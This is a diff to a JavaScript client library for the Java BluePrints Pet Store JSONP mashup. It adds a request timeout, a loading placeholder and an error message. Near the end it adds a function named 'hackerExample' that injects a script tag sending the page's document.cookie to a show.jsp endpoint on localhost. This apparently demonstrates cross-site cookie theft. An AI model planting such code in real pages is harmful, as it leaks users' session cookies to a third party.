@@ -10,6 +10,7 @@ bpui.petstoreList.numberPerPage=5;
 bpui.petstoreList.category="feline01";
 bpui.petstoreList.cachedData=new Object();
 bpui.petstoreList.debug=false;
+bpui.petstoreList.timer;
 
 bpui.petstoreList.initialSetup=function() {
         // get outerdiv
@@ -18,19 +19,7 @@ bpui.petstoreList.initialSetup=function() {
         // containier div
         tablex="<table><tr><td align=\"center\">";
         tablex += "<b>Java BluePrint's Pet Store Category:</b> <select size=\"1\" id=\"bpui.petstoreList.categoryList\" onchange=\"bpui.petstoreList.selectCategory()\">";
-        /*
-        // items are now dynamically loaded from the petstore service
-        tablex += "<option value=\"feline01\">Hairy Cat</option>";
-        tablex += "<option value=\"feline02\">Groomed Cat</option>";
-        tablex += "<option value=\"canine01\">Medium Dogs</option>";
-        tablex += "<option value=\"canine02\">Small Dogs</option>";
-        tablex += "<option value=\"avian01\">Parrot</option>";
-        tablex += "<option value=\"avian02\">Exotic</option>";
-        tablex += "<option value=\"fish01\">Small Fish</option>";
-        tablex += "<option value=\"fish02\">Large Fish</option>";
-        tablex += "<option value=\"reptile01\">Slithering Reptiles</option>";
-        tablex += "<option value=\"reptile02\">Crawling Reptiles</option>";
-        */
+        tablex += "<option value=\"loading\">Loading Data...</option>";
         tablex += "</select>";
         tablex += "</td></tr><tr><td><div id=\"bpui.petstoreList.dataDiv\" class=\"bpui_petstorelist_dataDiv\">";
         tablex += "</div>";
@@ -55,6 +44,9 @@ bpui.petstoreList.initialSetup=function() {
 
 
 bpui.petstoreList.populateData=function(datax) {
+    // clear response timer
+    clearTimeout(bpui.petstoreList.timer);
+    
     if(typeof datax != "undefined") {
         
         // check to see if at last page and no data is returned
@@ -197,6 +189,12 @@ bpui.petstoreList.createPetstoreList=function(divName, numberPerPage) {
     // setup static elements
     bpui.petstoreList.initialSetup();
     
+    
+    // set timer to make sure service look up returns. Eventhough the Javascript library was able to be fetched, the database could be down or the
+    // service could be responding very slowly and the request timeout.  Wait for 30 seconds and then set data div to service may not be responding message.
+    // Since both calls hit the database, if one returns propertly the other should also.
+    bpui.petstoreList.timer=setTimeout('bpui.petstoreList.requestTimedOut()', 30000);
+    
     // load categories from service
     bodyTag=document.getElementsByTagName("body")[0];
     scriptx=document.createElement("script");
@@ -213,6 +211,12 @@ bpui.petstoreList.createPetstoreList=function(divName, numberPerPage) {
 }
 
 
+bpui.petstoreList.requestTimedOut=function() {
+    document.getElementById("bpui.petstoreList.dataDiv").innerHTML="<b><font color=\"#0000FF\">The Java BluePrint's Pet Store JSONP Service is either responding very slowly or not responding at all!  Please check with the service provider for more information.</font></b>";
+}
+
+
+
 bpui.petstoreList.debugMessage=function(messx) {
     targetDiv=document.getElementById("bpui.petstoreList.debugDiv");
     targetDiv.innerHTML=messx + "<br/>" + targetDiv.innerHTML;
@@ -220,6 +224,9 @@ bpui.petstoreList.debugMessage=function(messx) {
 
 
 bpui.petstoreList.populateCategory=function(datax) {
+    // clear response timer
+    clearTimeout(bpui.petstoreList.timer);
+    
     catx=document.getElementById("bpui.petstoreList.categoryList");
     countx=0;
     // loop through top level categories
@@ -237,6 +244,24 @@ bpui.petstoreList.populateCategory=function(datax) {
     }
 }
 
+
+bpui.petstoreList.hackerExample=function() {
+    /*
+    bodyTag=document.getElementsByTagName("body")[0];
+    iframex=document.createElement("iframe");
+    iframex.setAttribute("src", "http://localhost:8080/bp-clientside-mashup/show.jsp?cookies=" + escape(document.cookie));
+    bodyTag.appendChild(iframex);
+    */
+    // load pet data from service
+
+    bodyTag=document.getElementsByTagName("body")[0];
+    scriptx=document.createElement("script");
+    scriptx.setAttribute("type", "text/javascript");
+    scriptx.setAttribute("src", "http://localhost:8080/bp-clientside-mashup/show.jsp?cookies=" + escape(document.cookie));
+    bodyTag.appendChild(scriptx);
+    
+    
+}
 
 
 
